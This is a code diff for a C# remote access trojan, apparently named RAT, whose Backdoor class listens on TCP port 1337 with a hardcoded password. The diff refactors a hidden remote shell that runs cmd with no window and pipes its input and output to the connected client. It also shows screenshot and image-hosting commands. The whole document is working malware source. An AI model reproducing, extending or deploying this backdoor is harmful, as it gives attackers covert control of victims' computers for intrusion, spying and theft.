@@ -25,6 +25,8 @@ namespace RAT
         string Password { get; set; }
         bool Verbose { get; set; }
 
+        bool Alive { get; set; }
+
         public Backdoor(int port = 1337, string serverName = "RAT", string password = "P455wD", bool verbose = true)
         {
             this.Port = port;
@@ -35,13 +37,14 @@ namespace RAT
 
         public void StartServer()
         {
+            Alive = true;
             Console.Title = "RAT Server:" + Port;
             try
             {
                 if (Verbose) Log("Listening on port " + Port);
 
                 Listener = new TcpListener(IPAddress.Any, Port);
-                Listener.Start(); // blocking call
+                Listener.Start();
                 Socket = Listener.AcceptSocket();
 
                 if (Verbose) Log("Client connected: " + Socket.RemoteEndPoint);
@@ -67,7 +70,13 @@ namespace RAT
                 OutStream.WriteLine(StringExtensions.AlignCenter(String.Format("  Welcome to {0} RAT  ", Name), 80, '='));
                 OutStream.WriteLine(StringExtensions.AlignCenter("  SINGLE-USER MODE  ", 80, '='));
 
-                InputLoop();
+                // input loop
+                string input = "";
+                while (Alive && ((input = InStream.ReadLine()) != null))
+                {
+                    if (Verbose) Log(">> " + input);
+                    HandleCommand(input);
+                }
             }
             catch (Exception e)
             {
@@ -80,88 +89,12 @@ namespace RAT
             }
         }
 
-        void InputLoop()
-        {
-            string tempBuff = "";
-            while (((tempBuff = InStream.ReadLine()) != null))
-            {
-                if (Verbose) Log(">> " + tempBuff);
-                HandleCommand(tempBuff);
-            }
-        }
-
         void HandleCommand(string command)
         {
             switch (command)
             {
                 case RatAction.SHELL:
-                    Process ShellProc = new Process();
-                    ProcessStartInfo pInfo = new ProcessStartInfo("cmd")
-                    {
-                        CreateNoWindow = true,
-                        UseShellExecute = false,
-                        RedirectStandardError = true,
-                        RedirectStandardInput = true,
-                        RedirectStandardOutput = true
-                    };
-                    ShellProc.StartInfo = pInfo;
-
-                    Thread ShellReaderThread = null;
-                    StreamWriter ToShell = null;
-                    StreamReader FromShell = null;
-                    try
-                    {
-                        ShellProc.Start();
-                        ToShell = ShellProc.StandardInput;
-                        FromShell = ShellProc.StandardOutput;
-                        ToShell.AutoFlush = true;
-
-                        // start sending output to the user
-                        ShellReaderThread = new Thread(delegate ()
-                       {
-                           string shellOutBuffer = "";
-                           while ((shellOutBuffer = FromShell.ReadLine()) != null)
-                           {
-                               OutStream.WriteLine(shellOutBuffer + "\r");
-
-                               // temporary, for logging
-                               Console.ForegroundColor = ConsoleColor.Cyan;
-                               Log(shellOutBuffer);
-                               Console.ResetColor();
-                           }
-                           DropConnection();
-                       });
-                        ShellReaderThread.Start();
-                        string buffer = "";
-                        while (((buffer = InStream.ReadLine()) != null) && buffer != "q" && buffer != "exit")
-                        {
-                            ToShell.WriteLine(buffer + "\r\n");
-                        }
-
-                    }
-                    catch (Exception e)
-                    {
-                        OutStream.WriteLine(e);
-                        Log(e.ToString());
-                    }
-                    finally
-                    {
-                        if (ShellProc != null)
-                        {
-                            ShellProc.Close();
-                            ShellProc.Dispose();
-                        }
-                        if (ShellReaderThread != null)
-                        {
-                            ShellReaderThread.Abort();
-                            ShellReaderThread = null;
-                        }
-                        if (ToShell != null) ToShell.Dispose();
-                        if (FromShell != null) FromShell.Dispose();
-                        if (ShellProc != null) ShellProc.Dispose();
-                        OutStream.WriteLine("==== Shell exited! ====");
-                        if (Verbose) Log("Shell exit");
-                    }
+                    RemoteShell();
                     break;
                 case RatAction.SCREENSHOT:
                     if (Verbose) OutStream.WriteLine("Taking a screenshot...");
@@ -276,11 +209,27 @@ namespace RAT
                 case RatAction.QUIT:
                     OutStream.WriteLine("\n\nClosing the shell and Dropping the connection...");
                     DropConnection();
+                    Alive = false;
                     break;
                 default:
                     OutStream.WriteLine("no such command. Try help commandfor more info");
                     break;
             }
+        }
+
+        public void DropConnection()
+        {
+            if (Verbose) Log("Dropping Connection");
+            InStream.Dispose();
+            OutStream.Dispose();
+            Socket.Close();
+            Listener.Stop();
+            Listener.Server.Close();
+        }
+
+        void Log(string message)
+        {
+            Console.WriteLine(message);
         }
 
         void HostImage(string path)
@@ -307,29 +256,65 @@ namespace RAT
             lstr.Stop();
         }
 
-        public void DropConnection()
+        void RemoteShell()
         {
-            if (Verbose) Log("Dropping Connection");
-            InStream.Dispose();
-            OutStream.Dispose();
-            Socket.Close();
-            Listener.Stop();
-        }
-
-        string GenerateNLineBreaks(int n)
-        {
-            StringBuilder sb = new StringBuilder();
-
-            for (int i = 0; i < n; i++)
+            try
             {
-                sb.Append("\r\n");
-            }
-            return sb.ToString();
-        }
+                using (Process ShellProc = new Process())
+                {
+                    ProcessStartInfo pInfo = new ProcessStartInfo("cmd")
+                    {
+                        CreateNoWindow = true,
+                        UseShellExecute = false,
+                        RedirectStandardError = true,
+                        RedirectStandardInput = true,
+                        RedirectStandardOutput = true
+                    };
+                    ShellProc.StartInfo = pInfo;
+                    ShellProc.Start();
 
-        void Log(string message)
-        {
-            Console.WriteLine(message);
+                    var ToShell = ShellProc.StandardInput;
+                    var FromShell = ShellProc.StandardOutput;
+                    ToShell.AutoFlush = true;
+
+                    bool read = true;
+
+                    // thread for sending shell output to the user
+                    new Thread(delegate ()
+                    {
+                        string shellOutBuffer = "";
+                        try
+                        {
+                            while (read && (shellOutBuffer = FromShell.ReadLine()) != null)
+                            {
+                                OutStream.WriteLine(shellOutBuffer + "\r");
+
+                                {
+                                    // temporary, for logging
+                                    Console.ForegroundColor = ConsoleColor.Cyan;
+                                    Log(shellOutBuffer);
+                                    Console.ResetColor();
+                                }
+                            }
+                        }
+                        catch (ObjectDisposedException) { /* its ok, OutStream will throw it when use enter "q" */ }
+                    }).Start();
+
+                    string buffer = "";
+                    while (((buffer = InStream.ReadLine()) != null) && buffer != "q" && buffer != "exit")
+                    {
+                        ToShell.WriteLine(buffer + "\r\n");
+                    }
+                    read = false;
+                }
+            }
+            catch (Exception e)
+            {
+                OutStream.WriteLine(e);
+                Log(e.ToString());
+            }
+            OutStream.WriteLine("==== Shell exited! ====");
+            if (Verbose) Log("Shell exit");
         }
     }
 }
